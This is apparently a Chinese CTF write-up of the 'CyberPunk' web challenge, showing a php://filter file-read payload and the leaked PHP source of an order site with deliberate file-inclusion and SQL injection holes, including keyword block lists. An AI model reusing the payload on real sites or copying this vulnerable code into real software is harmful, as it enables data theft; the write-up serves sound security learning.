<h2 id="华北赛区-Day1-Web5-CyberPunk"><a href="#华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="华北赛区 Day1 Web5 CyberPunk"></a>华北赛区 Day1 Web5 CyberPunk</h2><p>是一个登入页面，查看网页源码，在最后发现了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>

<p>可能是文件下载或者是文件包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#x2F;index.php?file&#x3D;index.php   返回数据为空</span><br></pre></td></tr></table></figure>

<p>尝试使用伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<p>读取成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$file &#x3D; (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;phar|zip|bzip2|zlib|data|input|%00&#x2F;i&quot;,$file)) &#123;</span><br><span class="line">        echo(&#39;no way!&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    @include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;index&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;h3&gt;提交订单&lt;&#x2F;h3&gt;</span><br><span class="line">                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;.&#x2F;confirm.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;application&#x2F;x-www-urlencoded&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;我正是送钱之人&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;search.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;搜索&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;h1&gt;订单查询&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;查询订单&lt;&#x2F;button&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt; </span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;    </span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;change.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单修改成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;修改收货地址&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;h1&gt;修改收货地址&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;修改订单&lt;&#x2F;button&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;delete.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result &#x3D; $db-&gt;query(&#39;delete from &#96;user&#96; where &#96;user_id&#96;&#x3D;&#39; . $row[&quot;user_id&quot;]);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单删除成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;删除订单&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;h1&gt;删除订单&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;删除订单&lt;&#x2F;button&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot; style&#x3D;&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

